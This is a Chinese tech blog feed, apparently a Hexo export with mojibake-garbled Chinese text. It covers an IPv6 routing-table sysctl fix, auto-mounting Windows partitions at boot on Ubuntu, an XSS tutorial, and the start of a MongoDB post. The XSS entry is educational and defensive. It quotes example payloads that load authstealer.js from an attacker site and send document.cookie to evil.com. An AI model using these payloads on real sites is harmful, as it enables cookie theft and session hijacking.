<h2 id="æ— æ³•åˆ†é…å†…å­˜åŸå› åˆ†æ"><a href="#æ— æ³•åˆ†é…å†…å­˜åŸå› åˆ†æ" class="headerlink" title="æ— æ³•åˆ†é…å†…å­˜åŸå› åˆ†æ"></a>æ— æ³•åˆ†é…å†…å­˜åŸå› åˆ†æ</h2><p>å¯¹äº<code>RTNETLINK answers: Cannot allocate memory</code>,å¸¸è§„æ€è·¯å½“ç„¶æ˜¯å†…å­˜ä¸è¶³äº†ï¼Œä½†æ˜¯é€šè¿‡<code>free</code>æŸ¥çœ‹è¿˜æœ‰<code>200M+</code>ç»å¯¹è¶³å¤Ÿã€‚ç„¶åè°·æ­Œä¸€ä¸‹ï¼Œè²Œä¼¼é‡åˆ°ç±»ä¼¼é—®é¢˜çš„ä¹Ÿä¸å°‘ï¼Œæ¯”å¦‚<a href="https://bugzilla.redhat.com/show_bug.cgi?id=1221915" target="_blank" rel="noopener">IPv6 routing/neighbor table suspected memory leak</a>ï¼Œä¹Ÿæ˜¯è·‘äº†å‡ å¤©å°±å‡ºè¿™ä¸ªé—®é¢˜äº†ã€‚</p>
<p>å¤§éƒ¨åˆ†çš„è§£å†³æ–¹æ¡ˆæ˜¯ä¿®æ”¹ä¸€ä¸ªç³»ç»Ÿçº§çš„é…ç½®å‚æ•°<code>net.ipv6.route.max_size</code>ï¼Œè¿™ä¸ªå‚æ•°å®šä¹‰äº†<code>IPv6</code>è·¯ç”±è¡¨çš„æœ€å¤§å°ºå¯¸ï¼Œé»˜è®¤å€¼ä¸º4096Bytesï¼Œå°†å…¶æ”¹å¤§ä¸€ç‚¹å°±å¯ä»¥äº†ã€‚</p>
<pre><code class="sh">$ sysctl net.ipv6.route.max_size
net.ipv6.route.max_size = 4096
$ sysctl -w net.ipv6.route.max_size=16384
net.ipv6.route.max_size = 16384
$ /usr/sbin/ip -6 addr add fe80::a263:91ff:fea7:6307/64 dev br0
</code></pre>
<p>ä¿®æ”¹å®Œåé‡å¯<code>IPv6</code>ï¼Œå‘ç°ä¸€åˆ‡éƒ½å›å½’æ­£å¸¸äº†ï¼ŒOh yeahğŸ˜€</p>
<p>é‚£ä¹ˆæœ€åè¿˜å‰©ä¸€ä¸ªé—®é¢˜ï¼ŒæŒ‰ç†è¯´<code>net.ipv6.route.max_size</code>æ˜¯ç³»ç»Ÿè‡ªå¸¦çš„é»˜è®¤å‚æ•°ï¼Œå‚æ•°å€¼ä¹Ÿæ˜¯ç»è¿‡å®è·µéªŒè¯çš„ï¼Œä¸€èˆ¬æ¥è¯´æ˜¯å¤Ÿç”¨çš„ï¼Œä¸ºä»€ä¹ˆä¼šå‡ºç°ä¸å¤Ÿç”¨çš„æƒ…å†µï¼Ÿä¾æ®ç½‘ä¸Šçš„èµ„æ–™æ˜¾ç¤ºï¼Œå¯èƒ½æ˜¯kernel memory leak, å…·ä½“åŸå› è¿˜éœ€è¿›ä¸€æ­¥æµ‹è¯•å’ŒéªŒè¯ï¼Œä½†è‡³å°‘ç›®å‰å¢å¤§è¿™ä¸ªå‚æ•°ç¡®å®èƒ½å¤Ÿè§£å†³é—®é¢˜ï¼</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://zh.wikipedia.org/wiki/Radvd" target="_blank" rel="noopener">wikipedia - radvd</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1221915" target="_blank" rel="noopener">IPv6 routing/neighbor table suspected memory leak</a></li>
<li><a href="http://ipv6.web.cern.ch/content/linux-ipv6-routing-table-maxsize-badly-dimensioned-compared-ipv4" target="_blank" rel="noopener">Linux IPv6 routing table max_size badly dimensioned compared to IPv4</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IPv6 </tag>
            
            <tag> router </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntuå¼€æœºè‡ªåŠ¨æŒ‚è½½Windowsç³»ç»Ÿä¸­çš„ç£ç›˜åˆ†åŒº]]></title>
      <url>https://www.litreily.top/2019/02/17/mount/</url>
      <content type="html"><![CDATA[<p>æœ¬äººç”µè„‘è£…æœ‰<code>ubuntu</code>å’Œ<code>windows</code>åŒç³»ç»Ÿï¼Œæœ‰æ—¶å€™éœ€è¦åœ¨<code>ubuntu</code>ä¸‹ä½¿ç”¨<code>windows</code>ç³»ç»Ÿä¸‹çš„æ–‡ä»¶ï¼Œæ¯æ¬¡æ‰‹åŠ¨æŒ‚è½½çš„è¯å¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥æƒ³è®©å®ƒå¼€æœºè‡ªåŠ¨æŒ‚è½½å¸¸ç”¨çš„<code>windows</code>ç£ç›˜åˆ†åŒºã€‚</p>
<h2 id="æŸ¥çœ‹åˆ†åŒº"><a href="#æŸ¥çœ‹åˆ†åŒº" class="headerlink" title="æŸ¥çœ‹åˆ†åŒº"></a>æŸ¥çœ‹åˆ†åŒº</h2><p>åœ¨æŒ‚è½½windowsç£ç›˜å‰ï¼Œéœ€è¦çŸ¥é“æ¯ä¸ªç£ç›˜çš„è·¯å¾„æˆ–<code>UUID</code>ï¼Œæ­¤æ—¶ä¸»è¦ä¾é <code>fdisk</code>å’Œ<code>blkid</code>ä¸¤ä¸ªæŒ‡ä»¤ï¼Œå‰ä¸€ä¸ªæŒ‡ä»¤è·å–åˆ†åŒºä¿¡æ¯ï¼Œåä¸€ä¸ªæŒ‡ä»¤è·å–<code>Block device</code>å—è®¾å¤‡çš„å±æ€§ã€‚</p>
<pre><code class="sh">$ sudo blkid
/dev/sda1: LABEL=&quot;Win10&quot; UUID=&quot;C4A0E65EA0E65708&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;6190c592-01&quot;
/dev/sda2: UUID=&quot;AE3C137D3C133FAF&quot; TYPE=&quot;ntfs&quot; PARTUUID=&quot;6190c592-02&quot;
/dev/sdb1: LABEL=&quot;Apps&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; PARTUUID=&quot;45ed07d2-c9e3-4167-8868-3e33f62784e1&quot;
/dev/sdb2: LABEL=&quot;Data&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; PARTUUID=&quot;2a8b4bf1-8357-4d65-bed4-f73f01b96431&quot;
/dev/sdb3: LABEL=&quot;Backup&quot; UUID=&quot;0000678400004823&quot; TYPE=&quot;ntfs&quot; PARTLABEL=&quot;Basic data partition&quot; PARTUUID=&quot;a7187083-2820-4eef-83ff-05d8899879a2&quot;
</code></pre>
<p>ä»ä¸Šé¢çš„è¾“å‡ºç»“æœå°±å¯ä»¥å°†Windowsç£ç›˜å¯¹åº”åˆ°å…·ä½“çš„å—è®¾å¤‡è·¯å¾„<code>/dev/sdax</code>ï¼Œå› ä¸ºç”µè„‘å«ä¸¤å—ç£ç›˜ï¼Œæ‰€ä»¥åŒ…å«<code>sda</code>åŠ<code>sdb</code>ã€‚è¿™é‡Œçš„å—è®¾å¤‡è·¯å¾„å’Œ<code>UUID</code>ä¼šå°†ä¸‹é¢çš„é…ç½®å‚æ•°ä¸­ç”¨åˆ°ã€‚</p>
<h2 id="ä¸´æ—¶æŒ‚è½½æ–¹æ¡ˆ"><a href="#ä¸´æ—¶æŒ‚è½½æ–¹æ¡ˆ" class="headerlink" title="ä¸´æ—¶æŒ‚è½½æ–¹æ¡ˆ"></a>ä¸´æ—¶æŒ‚è½½æ–¹æ¡ˆ</h2><p>å¯¹äºä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤å°†windowsçš„Cç›˜<code>/dev/sda1</code>æŒ‚è½½åˆ°<code>/mnt/c</code>ç›®å½•</p>
<pre><code class="sh">sudo mkdir /mnt/c
sudo mount -t ntfs /dev/sda1 /mnt/c
</code></pre>
<p>æ­¤ä¸´æ—¶æ–¹æ¡ˆåœ¨ç³»ç»Ÿé‡å¯åå°±å°†å¤±æ•ˆã€‚å¯¹äºå¸è½½ï¼Œä½¿ç”¨<code>sudo umount /mnt/c</code>å³å¯ã€‚</p>
<h2 id="å¼€æœºæŒ‚è½½æ–¹æ¡ˆ"><a href="#å¼€æœºæŒ‚è½½æ–¹æ¡ˆ" class="headerlink" title="å¼€æœºæŒ‚è½½æ–¹æ¡ˆ"></a>å¼€æœºæŒ‚è½½æ–¹æ¡ˆ</h2><h3 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h3><p>å¼€æœºå¯åŠ¨åè‡ªåŠ¨æŒ‚è½½çš„æ–¹æ¡ˆå°±éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶<code>/etc/fstab</code>å•¦,ä½¿ç”¨ç¼–è¾‘å™¨æ‰“å¼€åï¼ŒæŒ‰ä»¥ä¸‹æ ¼å¼æ·»åŠ æ–°çš„æŒ‚è½½é¡¹</p>
<pre><code class="sh">$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use &#39;blkid&#39; to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;
# / was on /dev/sdb5 during installation
UUID=4d2e5a83-d9fe-47bb-aa02-fee9ac8535e3 /               ext4    errors=remount-ro 0       1
# /boot was on /dev/sdb6 during installation
UUID=9b521dc2-ad85-4ca6-bb8b-f285b312aa49 /boot           ext4    defaults        0       2
# /home was on /dev/sdb7 during installation
UUID=f6b796dd-9e59-4f79-b70a-c2c8e5977163 /home           ext4    defaults        0       2
# swap was on /dev/sdb4 during installation
UUID=9430ea0e-7ff9-4167-9bf7-1f3e08d26d34 none            swap    sw              0       0
# /mnt/Data was on /dev/sdb2 during installation
/dev/sdb2                                /mnt/Data        ntfs    defaults        0       2
# /mnt/Backup was on /dev/sdb3 during installation
/dev/sdb3                                /mnt/Backup      ntfs    defaults        0       2
</code></pre>
<p>åé¢ä¸¤é¡¹å°±æ˜¯ç”¨æ¥æŒ‚è½½Windowsç£ç›˜çš„ï¼Œå½“ç„¶æ¯è¡Œå‰é¢çš„<code>/dev/sdbx</code>ä¹Ÿå¯ä»¥æ¢æˆ<code>UUID=xxxxx</code>ï¼Œä½†æ˜¯ç”±äºè¿™ä¸¤ä¸ªç£ç›˜çš„<code>UUID</code>ä¸€è‡´ï¼Œæ‰€ä»¥å¯èƒ½ä¼šæœ‰é—®é¢˜ï¼Œä¹Ÿè®¸å¯ä»¥ä½¿ç”¨<code>blkid</code>è¾“å‡ºçš„<code>PARTUUID</code>ï¼Œä½†æˆ‘æ²¡è¯•è¿‡ã€‚æ— è®ºå¦‚ä½•ï¼Œä»¥ä¸Šçš„è®¾ç½®æ–¹æ³•ç»å¯¹æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<h3 id="æŒ‚è½½æµ‹è¯•"><a href="#æŒ‚è½½æµ‹è¯•" class="headerlink" title="æŒ‚è½½æµ‹è¯•"></a>æŒ‚è½½æµ‹è¯•</h3><pre><code class="sh">sudo mkdir /mnt/{Data,Backup}
sudo mount -a
</code></pre>
<p>å¦‚æœæ‰§è¡Œä»¥ä¸ŠæŒ‡ä»¤æ²¡æœ‰æŠ¥é”™åˆ™è¯´æ˜æŒ‚è½½æˆåŠŸäº†ï¼Œé‡å¯å³å¯çœ‹åˆ°å¼€æœºåç³»ç»Ÿå·²ç»è‡ªåŠ¨æŒ‚è½½äº†è®¾å®šå·çš„ç£ç›˜ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> mount </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XSSè·¨ç«™è„šæœ¬æ”»å‡»]]></title>
      <url>https://www.litreily.top/2019/02/14/XSS/</url>
      <content type="html"><![CDATA[<p>è¿‘æœŸé‡åˆ°ä¸€å † Stored XSS vulnerability é—®é¢˜ï¼Œå³å­˜å‚¨å‹è·¨ç«™è„šæœ¬æ¼æ´ï¼Œæ‰€ä»¥æœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹XSSç›¸å…³çš„çŸ¥è¯†ã€‚</p>
<h2 id="XSSç®€ä»‹"><a href="#XSSç®€ä»‹" class="headerlink" title="XSSç®€ä»‹"></a>XSSç®€ä»‹</h2><p><code>XSS</code>æ˜¯è·¨ç«™è„šæœ¬<code>Cross-Site Scripting</code>çš„ç®€å†™ï¼Œè‡³äºä¸ºä»€ä¹ˆä¸æ˜¯<code>CSS</code>ï¼Œç›¸ä¿¡å¤§å®¶å¾ˆå®¹æ˜“çŒœåˆ°ï¼Œæ˜¯ä¸ºäº†é¿å…ä¸å‰ç«¯çš„å±‚å æ ·å¼è¡¨<code>Cascading Style Sheets</code>é‡åã€‚</p>
<p><code>XSS</code>æ¶‰åŠä¸‰ä¸ªè¦ç´ ï¼šä¸€ä¸ªç«™ç‚¹ï¼Œæ”»å‡»è€…å’Œå—å®³è€…ã€‚æ”»å‡»è€…é€šè¿‡æŸç«™ç‚¹çš„æ¼æ´æ³¨å…¥è„šæœ¬åˆ°è¯¥ç«™ç‚¹ï¼Œå—å®³è€…åœ¨ä½¿ç”¨æµè§ˆå™¨è®¿é—®è¯¥ç«™ç‚¹æ—¶å°±å¯èƒ½é­å—<code>XSS</code>æ”»å‡»ã€‚</p>
<p>è„šæœ¬ç±»å‹ä¸é™äº<code>javascript</code>, ä¹Ÿå¯ä»¥æ˜¯å…¶å®ƒè„šæœ¬ï¼Œå¦‚<code>VBScript</code>, <code>ActiveX</code> å’Œ <code>flash</code>ç­‰ï¼Œä½†ä¸»è¦è¿˜æ˜¯ä»¥<code>javascript</code>ä¸ºä¸»ã€‚</p>
<a id="more"></a>
<h2 id="XSSç±»å‹"><a href="#XSSç±»å‹" class="headerlink" title="XSSç±»å‹"></a>XSSç±»å‹</h2><p><code>XSS</code>çš„åˆ†ç±»è²Œä¼¼æ²¡æœ‰å›ºå®šæ ‡å‡†ï¼Œä½†çº¦å®šä¿—æˆçš„è¢«åˆ†ä¸ºæŒä¹…åŒ–çš„å­˜å‚¨å‹XSSå’ŒéæŒä¹…åŒ–çš„åå°„å‹XSSã€‚</p>
<h3 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h3><p><code>Stored XSS</code>, æŒä¹…åŒ–çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦ç”¨æˆ·åœ¨æµè§ˆå™¨æ‰“å¼€äº†è¿™ä¸ªç«™ç‚¹å°±ä¼šæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„è„šæœ¬ã€‚æ­¤ç±»<code>XSS</code>è¦æ±‚æ”»å‡»è€…å°†è„šæœ¬å­˜å‚¨è‡³ç«™ç‚¹æœåŠ¡å™¨ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œå¾ˆå¤šè®ºå›éƒ½æœ‰è¯„è®ºåŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡è¯„è®ºæŠŠè„šæœ¬ä¿¡æ¯å­˜å…¥ç«™ç‚¹æœåŠ¡å™¨ï¼Œå¦‚æœç«™ç‚¹æœªåŠ è¿‡æ»¤å’Œç¼–ç ï¼Œç›´æ¥å°†è„šæœ¬ä¿¡æ¯å½“åšæ™®é€šè¯„è®ºå­˜å…¥æ•°æ®åº“ï¼Œå…¶ä»–äººè®¿é—®è¯¥ç«™ç‚¹æ—¶å°±ä¼šæ‰§è¡Œè¯¥è„šæœ¬ã€‚</p>
<h3 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h3><p><code>Reflected XSS</code>, éæŒä¹…åŒ–çš„ï¼Œéœ€è¦ç”¨æˆ·æ‰“å¼€ç«™ç‚¹åæ‰§è¡ŒæŸäº›æ“ä½œæ–¹èƒ½è§¦å‘ï¼Œæ¯”å¦‚ç‚¹å‡»æŸä¸ªé“¾æ¥ï¼Œç„¶åè§¦å‘æ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„è„šæœ¬ï¼Œè„šæœ¬å¯ä»¥æ˜¯ä¸€ä¸ªä»£ç æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯æŒ‡å‘æ”»å‡»è€…æä¾›çš„è„šæœ¬é“¾æ¥ã€‚åˆ©ç”¨ç«™ç‚¹æ˜“å—æ”»å‡»çš„æ¼æ´ï¼Œå°±å¯ä»¥è®©ç”¨æˆ·æ‰§è¡Œä»»æ„è„šæœ¬ã€‚</p>
<p>æ­¤ç±»<code>XSS</code>æ”»å‡»è€…é€šå¸¸ä½¿ç”¨é‚®ä»¶æˆ–æ˜¯ä¸­é—´ç«™ç‚¹å‘é€å¸¦æœ‰è„šæœ¬çš„é“¾æ¥ç»™ç”¨æˆ·ï¼Œè€Œé“¾æ¥å¾€å¾€çœ‹èµ·æ¥å¾ˆæ­£å¸¸ï¼Œå¸¦æœ‰æ­£è§„ç«™ç‚¹çš„åŸŸåï¼Œè„šæœ¬éƒ¨åˆ†å¯èƒ½ä½¿ç”¨16è¿›åˆ¶ç¼–ç ï¼Œä¸å®¹æ˜“çœ‹å‡ºç«¯å€ªã€‚</p>
<p>ä¸‹é¢å¼•ç”¨çš„<a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent" target="_blank" rel="noopener">ç»´åŸºç™¾ç§‘</a>çš„ä¾‹å­:</p>
<pre><code class="yml"># æ”»å‡»è€…æä¾›çš„é“¾æ¥ï¼Œåœ¨è®¿é—®bobssite.orgçš„æœç´¢åŠŸèƒ½æ—¶æ‰§è¡Œè„šæœ¬
http://bobssite.org/search?q=&lt;script%20type=&#39;application/javascript&#39;&gt;alert(&#39;xss&#39;);&lt;/script&gt;

# ä¸‹é¢çš„é“¾æ¥è§¦å‘åä¼šæ‰§è¡Œæ”»å‡»è€…æœåŠ¡å™¨ä¸­çš„è„šæœ¬authstealer.js
http://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;

# ä¸‹é¢æ˜¯ç»è¿‡é¢„å…ˆç¼–ç åçš„é“¾æ¥
http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E
</code></pre>
<h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM-Based XSS"></a>DOM-Based XSS</h3><p>åŸºäºDOM(Document Object Model)çš„<code>XSS</code>ä¸ä»¥ä¸Šä¸¤ç§ä¸åŒçš„æ˜¯ï¼Œå®ƒå®Œå…¨å‘ç”Ÿåœ¨å®¢æˆ·ç«¯ï¼Œä¸æœåŠ¡å™¨ç«¯æ— å…³ï¼Œä½†åŒæ—¶åˆå¯ä»¥ç®—æ˜¯åå°„å‹<code>XSS</code>çš„å­é›†ï¼Œå› ä¸ºå®ƒä¹Ÿéœ€è¦ä¸€å®šçš„äº¤äº’æ‰èƒ½è§¦å‘ã€‚</p>
<p><code>DOM-Based XSS</code>åŸç†ï¼šç«™ç‚¹è·å–ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œç„¶åé€šè¿‡ç«™ç‚¹è‡ªå¸¦çš„jsä»£ç ä¿®æ”¹<code>DOM</code>ç»“æ„ï¼Œå¦‚æœè¾“å…¥çš„æ•°æ®æºå¸¦æœ‰æ¶æ„ä»£ç ï¼Œå°±å¯èƒ½å¯¼è‡´<code>XSS</code>æ”»å‡»ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œä»¥ä¸‹ä»£ç ç”¨æ¥æ˜¾ç¤ºè®¿é—®é“¾æ¥ï¼ˆå¦‚ï¼š<code>http://www.example.com?name=test</code>ï¼‰ä¸­æºå¸¦çš„ç”¨æˆ·å</p>
<pre><code class="js">var namePos=document.URL.indexOf(&quot;name=&quot;)
if (namePos != -1)
{
    var name = document.createElement(&#39;span&#39;);
    name.innerHTML = document.URL.substring(namePos, document.URL.length)
}
</code></pre>
<p>å¦‚æœç”¨æˆ·ååŒ…å«äº†æ¶æ„ä»£ç ï¼Œå¦‚<code>&lt;/span&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;span&gt;</code>ï¼Œè¿™å°±ä¼šåœ¨åŸå…ˆæƒ³è¦ç”Ÿæˆçš„<code>span</code>æ ‡ç­¾ååŠ å…¥æ”»å‡»è€…çš„è„šæœ¬å¹¶æ‰§è¡Œã€‚</p>
<h2 id="XSSæ”»å‡»çš„å±å®³ä¸é˜²èŒƒ"><a href="#XSSæ”»å‡»çš„å±å®³ä¸é˜²èŒƒ" class="headerlink" title="XSSæ”»å‡»çš„å±å®³ä¸é˜²èŒƒ"></a>XSSæ”»å‡»çš„å±å®³ä¸é˜²èŒƒ</h2><p>é€šè¿‡<code>XSS</code>æ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥è·å–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚åœ¨ç”¨æˆ·å®Œå…¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‹¿åˆ°ç”¨æˆ·ç™»å½•åçš„<code>Cookie</code>ä¿¡æ¯ï¼Œä¹‹åé€šè¿‡ä¼šè¯åŠ«æŒå†’å……çœŸå®ç”¨æˆ·è®¿é—®ç½‘ç«™ï¼Œå’Œç›—å·ä¸€æ ·ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹è´¦æˆ·å¯†ç ï¼Œè·å–è´¦æˆ·å†…çš„ç§äººä¿¡æ¯ç”šè‡³è´¢äº§ã€‚æ›´è¿‘ä¸€æ­¥ï¼Œå¦‚æœæ”»å‡»è€…ç”¨æ­¤æ–¹æ³•è·å–åˆ°äº†ç«™ç‚¹ç®¡ç†å‘˜çš„è´¦æˆ·ï¼Œé‚£ä¹ˆå°†å¯èƒ½æ‹¿åˆ°ç«™ç‚¹çš„æ§åˆ¶æƒã€‚</p>
<p>å…·ä½“ä¾‹å­å¯ä»¥å‚è€ƒ<a href="https://www.acunetix.com/websitesecurity/cross-site-scripting/" target="_blank" rel="noopener">Cross-site Scripting (XSS) Attack</a></p>
<pre><code class="js">window.location=&quot;http://evil.com/?cookie=&quot; + document.cookie
</code></pre>
<p>é‚£ä¹ˆ<code>XSS</code>è¯¥å¦‚ä½•é˜²èŒƒå‘¢ï¼Ÿ</p>
<ol>
<li><p>å¸¸ç”¨åŠæ³•æ˜¯è¿›è¡Œç‰¹æ®Šå­—ç¬¦æ›¿æ¢ï¼Œå¯¹äºæ‰€æœ‰çš„ç”¨æˆ·è¾“å…¥ï¼Œéœ€è¦è¿›è¡Œè¿‡æ»¤æ£€æŸ¥ï¼Œå¯¹äºä¸Šä¸‹æ–‡è¾“å‡ºï¼Œå°†<code>&lt;&gt;/\#$&amp;?&#39;&quot;</code>ç­‰å­—ç¬¦ç¼–ç è½¬ä¹‰ä¸ºå¯¹åº”çš„<code>html</code>ç ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å½“å‰ä½¿ç”¨æœ€å¤šçš„æ–¹æ¡ˆï¼›</p>
</li>
<li><p>å¯¹äºä¸ä¿¡ä»»çš„ç”¨æˆ·è¾“å…¥ï¼Œå¯ä»¥ä½¿ç”¨ä¸“é—¨çš„æœºåˆ¶ï¼ˆå¦‚ï¼š<a href="https://en.wikipedia.org/wiki/HTML_sanitization" target="_blank" rel="noopener">HTML sanitization</a>ï¼‰å»è¾¨åˆ«è¾“å…¥çš„æœ‰æ•ˆæ€§ã€‚</p>
</li>
<li><p>è€Œå¯¹äº<code>Cookie</code>ï¼Œä¸ºäº†é˜²æ­¢æ”»å‡»è€…ä½¿ç”¨çªƒå–çš„<code>Cookie</code>è¿›è¡Œè®¿é—®ï¼Œå¯ä»¥é€šè¿‡ç»‘å®šç”¨æˆ·<code>IP</code>å’Œ<code>Cookie</code>ï¼Œä»…å…è®¸æŒ‡å®š<code>IP</code>çš„ç”¨æˆ·ä½¿ç”¨ç‰¹å®š<code>Cookie</code>æ‰æœ‰æ•ˆã€‚</p>
</li>
</ol>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡ç®€è¿°äº†<code>XSS</code>çš„æ¦‚å¿µï¼Œä»‹ç»äº†å­˜å‚¨å‹ã€åå°„å‹å’Œ<code>DOM-Based</code>ä¸‰ç§<code>XSS</code>æ”»å‡»æ‰‹æ®µï¼Œå¹¶äºˆä»¥ä¸¾ä¾‹è¯´æ˜ï¼Œæœ€åç®€å•ä»‹ç»äº†<code>XSS</code>å±å®³åŠå…¶å¸¸ç”¨é˜²èŒƒæ‰‹æ®µã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://www.acunetix.com/websitesecurity/cross-site-scripting/" target="_blank" rel="noopener">Cross-site Scripting (XSS) Attack</a></li>
<li><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet</a></li>
<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank" rel="noopener">Wikipedia - Cross-site scripting</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
            <category> Security </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pythonä¹‹MongoDBæ•°æ®åˆ†æåŠå…¶Highchartså¯è§†åŒ–]]></title>
      <url>https://www.litreily.top/2019/01/22/highcharts/</url>
      <content type="html"><![CDATA[<p>è¿‘æœŸä½¿ç”¨<code>requests</code>æŠŠå†…éƒ¨<code>bugziila</code>ä¸Šçš„<code>bug</code>æ•°æ®çˆ¬å–äº†ä¸€éï¼Œå¹¶å­˜å…¥äº†æœ¬åœ°çš„<code>MongoDB</code>æ•°æ®åº“ï¼Œæƒ³ç€å¯¹æ•°æ®åšäº›ç®€å•çš„å¯è§†åŒ–å¤„ç†ï¼Œå°†æ‰€æœ‰äº§å“çš„bugæ•°åšä¸€ä¸ªç»Ÿè®¡å’Œå¯è§†åŒ–ï¼Œäºæ˜¯ä¾¿æœ‰äº†è¿™ç¯‡ç®€çŸ­çš„æ–‡ç« ã€‚</p>
<a id="more"></a>
<h2 id="MongoDBä¸­çš„æ•°æ®å­˜å‚¨æ ¼å¼"><a href="#MongoDBä¸­çš„æ•°æ®å­˜å‚¨æ ¼å¼" class="headerlink" title="MongoDBä¸­çš„æ•°æ®å­˜å‚¨æ ¼å¼"></a>MongoDBä¸­çš„æ•°æ®å­˜å‚¨æ ¼å¼</h2><p>ä¹‹å‰çˆ¬å–æ•°æ®åï¼Œå­˜å…¥<code>MongoDB</code>çš„æ•°æ®æ ¼å¼å¦‚ä¸‹ï¼Œè€Œæˆ‘è¦åˆ†æçš„ä»…ä»…æ˜¯å…¶ä¸­çš„<code>metadata.Product</code></p>
<pre><code class="json">{
    &quot;_id&quot; : ObjectId(&quot;5c3ea1d3fbf7884588041acc&quot;),
    &quot;id&quot; : 1,
    &quot;title&quot; : &quot;\&quot;Show interface dot11radio advanced\&quot; command doesn&#39;t work&quot;,
    &quot;metadata&quot; : {
        &quot;Status&quot; : &quot;å·²è§£æ±º (RESOLVED) å·²ä¿®å¾© (FIXED)&quot;,
        &quot;Product&quot; : &quot;AP54GTSW&quot;,
        &quot;Component&quot; : &quot;Baseline&quot;,
        &quot;Version&quot; : &quot;0.1&quot;,
        &quot;Platform&quot; : &quot;PC Linux&quot;,
        &quot;Importance&quot; : &quot;P2 normal&quot;,
        &quot;Assigned&quot; : &quot;Wallace Peng&quot;,
        &quot;Reported_author&quot; : &quot;happy Hu&quot;,
        &quot;Reported&quot; : &quot;2004-05-11 20:32 CST&quot;,
        &quot;Modified&quot; : &quot;2010-08-27 15:42 CST&quot;
    },
    &quot;comments&quot; : {
        &quot;æè¿°&quot; : {
            &quot;user&quot; : &quot;happy Hu&quot;,
            &quot;time&quot; : &quot;2004-05-11 20:32:24 CST&quot;,
            &quot;text&quot; : &quot;\&quot;Show interface dot11radio advanced\&quot; command doesn&#39;t work -- Happy&quot;
        },
        &quot;æ„è¦‹1&quot; : {
            &quot;user&quot; : &quot;Wallace Peng&quot;,
            &quot;time&quot; : &quot;2004-05-12 21:01:56 CST&quot;,
            &quot;text&quot; : &quot;image 0.1rc8 fixed this bug. -- Wallace&quot;
        }
    }
}
</code></pre>
